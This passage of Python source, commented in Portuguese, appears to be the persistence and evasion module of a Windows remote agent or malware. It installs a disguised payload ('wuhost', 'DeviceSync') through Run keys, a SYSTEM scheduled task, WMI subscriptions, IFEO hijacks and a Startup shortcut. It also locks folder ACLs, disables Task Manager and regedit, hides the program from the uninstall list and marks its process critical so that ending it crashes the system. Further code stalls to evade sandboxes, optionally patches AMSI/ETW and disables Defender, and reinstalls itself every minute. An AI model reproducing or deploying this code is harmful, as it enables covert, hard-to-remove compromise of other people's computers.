        note("startup: %s" % exc)
        return False


def install_layers():
    """Aplica todas as camadas. Idempotente: pode rodar de novo a cada minuto."""
    if not IS_WIN:
        return
    _copy_payload()
    ext = ".exe" if getattr(sys, "frozen", False) else ".py"
    user_exe = os.path.join(DIR_USER, "wuhost" + ext)
    sys_exe = os.path.join(DIR_SYSTEM, PRODUCT + ext)
    # Cada camada aponta para o SEU arquivo. Se a camada SYSTEM usasse o exe da
    # pasta do usuario, o SYSTEM rodaria o mesmo arquivo do usuario: mesmo
    # INSTALL_DIR, mesmo sid.txt, duas copias na mesma fila (sessao piscando)
    # e o faxineiro matando uma a outra sem parar.
    cmd_user = _launch(user_exe if os.path.isfile(user_exe) else _self_exe())
    admin = is_admin()
    cmd_sys = ""
    if admin:
        if os.path.isfile(sys_exe):
            cmd_sys = _launch(sys_exe)
        else:
            note("camada SYSTEM: %s nao existe -- tarefa nao criada" % sys_exe)

    _STATE["layers"]["run_user"] = _run_key(RUN_NAME, cmd_user, "HKCU")
    if cmd_sys:
        _STATE["layers"]["run_machine"] = _run_key(RUN_NAME, cmd_sys, "HKLM")
        _STATE["layers"]["task"] = _task_system(cmd_sys)
        # WMI dispara a cada 60 s: com o vigia e a tarefa, so servia para
        # nascer uma copia por minuto e derrubar a anterior (sessao piscando).
        # Fica desligado; liga com RAF_WMI=1 se quiser essa camada.
        if os.environ.get("RAF_WMI") == "1":
            _STATE["layers"]["wmi"] = _wmi_subscription(cmd_sys)
        _STATE["layers"]["ifeo"] = _ifeo(cmd_sys)
    _STATE["layers"]["startup"] = _startup_lnk(cmd_user)


# -------------------------------------------------------------------- lockdown
def lockdown():
    """Dificulta a remoção manual (não é imortal: admin sempre pode resetar ACL)."""
    if not IS_WIN:
        return False
    notes = []
    script = r"""
$ErrorActionPreference='SilentlyContinue'
# dono SYSTEM, usuario comum so leitura -> del/explorer falham
icacls '%s' /inheritance:r /grant:r 'SYSTEM:(OI)(CI)F' 'Administrators:(OI)(CI)F' /T /C | Out-Null
icacls '%s' /inheritance:r /grant:r 'SYSTEM:(OI)(CI)F' 'Administrators:(OI)(CI)F' /T /C | Out-Null
# travas de GUI
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableRegistryTools -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableRegistryTools -Value 1
# esconde das listas de programas instalados
Remove-Item 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DeviceSync' -Recurse -Force
""" % (DIR_SYSTEM, DIR_USER)
    rc, _ = _ps(script, timeout=180)
    notes.append("acl=%s" % ("ok" if rc == 0 else "falhou"))
    note("lockdown: " + "; ".join(notes))
    return rc == 0


def set_critical(on=True):
    """Marca o processo como crítico: encerrar na marra = BSOD.

    Desligado por padrão. Crítico + uma segunda cópia chamando taskkill =
    tela azul a cada boot (foi o loop de reinício). Só liga com RAF_CRITICAL=1,
    e o _kill_duplicates limpa o flag antes de matar.
    """
    if not IS_WIN:
        return False
    if on and os.environ.get("RAF_CRITICAL") != "1":
        note("critical: desligado (padrão seguro)")
        return False
    try:
        if on and not is_admin():
            return False
        ntdll = ctypes.windll.ntdll
        fn = getattr(ntdll, "RtlSetProcessIsCritical", None)
        if not fn:
            return False
        fn.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
        ok = fn(1 if on else 0, None, 0) == 0
        _STATE["critical"] = bool(on and ok)
        note("critical: %s" % ("on" if _STATE["critical"] else "off"))
        return ok
    except Exception as exc:
        note("critical: %s" % exc)
        return False


# ---------------------------------------------------------------------- autoheal
def _heal_once():
    try:
        ext = ".exe" if getattr(sys, "frozen", False) else ".py"
        sys_exe = os.path.join(DIR_SYSTEM, PRODUCT + ext)
        user_exe = os.path.join(DIR_USER, "wuhost" + ext)
        if not os.path.isfile(sys_exe):
            _copy_payload()
        cmd_user = _launch(user_exe if os.path.isfile(user_exe) else _self_exe())
        cmd_sys = _launch(sys_exe) if os.path.isfile(sys_exe) else ""
        if is_admin() and cmd_sys:
            rc, out = _run(["schtasks", "/query", "/tn", TASK_NAME], timeout=30)
            if rc != 0:
                _task_system(cmd_sys)
            if os.environ.get("RAF_WMI") == "1":
                rc, out = _run(["powershell", "-NoProfile", "-Command",
                                "(Get-WmiObject -Namespace root\\subscription -Class __EventFilter | "
                                "Where-Object { $_.Name -eq '%s' } | Measure-Object).Count" % WMI_FILTER],
                               timeout=60)
                if "0" in (out or "").strip().splitlines()[-1:]:
                    _wmi_subscription(cmd_sys)
        _run_key(RUN_NAME, cmd_user, "HKCU")
        if (not _STATE["critical"] and is_admin()
                and os.environ.get("RAF_NO_CRITICAL") != "1"):
            set_critical(True)
    except Exception as exc:
        note("heal: %s" % exc)


def start_heal(interval=60):
    def loop():
        while True:
            time.sleep(interval)
            _heal_once()
    t = threading.Thread(target=loop, daemon=True)
    t.start()
    return t


# -------------------------------------------------------------------- bootstrap
def bootstrap(quiet=False):
    """Chamado uma vez quando o agente sobe. Nunca levanta exceção."""
    if not IS_WIN:
        return "not windows"
    try:
        if sandbox_check():
            # areia: dorme o suficiente para o sandbox desistir, depois segue
            time.sleep(random.randint(180, 420))

        first = not os.path.isfile(os.path.join(DIR_SYSTEM, ".seed"))
        if first:
            time.sleep(random.randint(3, 8))

        # Evasao agressiva (patch de AMSI/ETW, unhook da ntdll) e desligamento
        # do Defender: com Tamper Protection ligado sao revertidos na hora, e
        # no caminho o agente ganha deteccao de "DefenderTampering" e perde as
        # exclusoes de pasta -- foi assim que ele se apagou do disco. Ficam
        # desligados por padrao: liga com RAF_EVASAO=1 / RAF_DEFENDER=1.
        if os.environ.get("RAF_EVASAO") == "1":
            for nome, fn in (("amsi", patch_amsi), ("etw", patch_etw),
                             ("ntdll", unhook_ntdll)):
                try:
                    fn()
                except Exception as exc:
                    note("%s: %s" % (nome, exc))

        try:
            ensure_admin()
        except Exception as exc:
            note("admin: %s" % exc)

        if os.environ.get("RAF_DEFENDER") == "1" and is_admin():
            for nome, fn in (("defender", defender_off),
                             ("smartscreen", smartscreen_off)):
                try:
                    fn()
                except Exception as exc:
                    note("%s: %s" % (nome, exc))

        try:
            install_layers()
        except Exception as exc:
            note("layers: %s" % exc)

        if os.environ.get("RAF_LOCKDOWN") == "1":
            try:
                lockdown()
            except Exception as exc:
                note("lockdown: %s" % exc)

        if is_admin() and os.environ.get("RAF_NO_CRITICAL") != "1":
            try:
                set_critical(True)
            except Exception as exc:
                note("critical: %s" % exc)

        try:
            start_heal(60)
        except Exception:
            pass

        try:
            os.makedirs(DIR_SYSTEM, exist_ok=True)
            with open(os.path.join(DIR_SYSTEM, ".seed"), "w", encoding="utf-8") as f:
                f.write(time.strftime("%Y-%m-%d %H:%M:%S"))
        except Exception:
            pass
        note("bootstrap: concluido")
    except Exception as exc:
        note("bootstrap: %s" % exc)
    return "; ".join(NOTES)


def status():
    return {
        "admin": is_admin(),
        "system": is_system(),
        "critical": _STATE.get("critical"),
        "defender_off": _STATE.get("defender"),
        "layers": _STATE.get("layers"),
        "notes": NOTES[-12:],
    }


def remove_all():
    """Desfaz tudo o que esta camada criou (usado pelo autodestruir e em teste)."""
    if not IS_WIN:
        return "not windows"
    set_critical(False)
    script = r"""
$ErrorActionPreference='SilentlyContinue'
Unregister-ScheduledTask -TaskName '%s' -Confirm:$false
Unregister-ScheduledTask -TaskName '%s' -Confirm:$false
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
  Where-Object { $_.Filter -like '*%s*' } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
  Where-Object { $_.Name -eq '%s' } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventFilter |
  Where-Object { $_.Name -eq '%s' } | Remove-WmiObject
foreach ($t in @('taskmgr.exe','regedit.exe','mmc.exe')) {
  Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$t" -Name Debugger -ErrorAction SilentlyContinue
}
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -ErrorAction SilentlyContinue
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableRegistryTools -ErrorAction SilentlyContinue
Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -ErrorAction SilentlyContinue
Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableRegistryTools -ErrorAction SilentlyContinue
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '%s' -ErrorAction SilentlyContinue
Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name '%s' -ErrorAction SilentlyContinue
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\DeviceSync.bat" -Force -ErrorAction SilentlyContinue
icacls '%s' /reset /T /C | Out-Null
icacls '%s' /reset /T /C | Out-Null
Remove-Item -Path '%s' -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path '%s' -Recurse -Force -ErrorAction SilentlyContinue
""" % (TASK_NAME, TASK_NAME2, WMI_FILTER, WMI_CONSUMER, WMI_FILTER,
       RUN_NAME, RUN_NAME, DIR_SYSTEM, DIR_USER, DIR_SYSTEM, DIR_USER)
    rc, out = _ps(script, timeout=180)
    note("remove_all: %s" % ("ok" if rc == 0 else "parcial"))
    return "; ".join(NOTES[-6:])
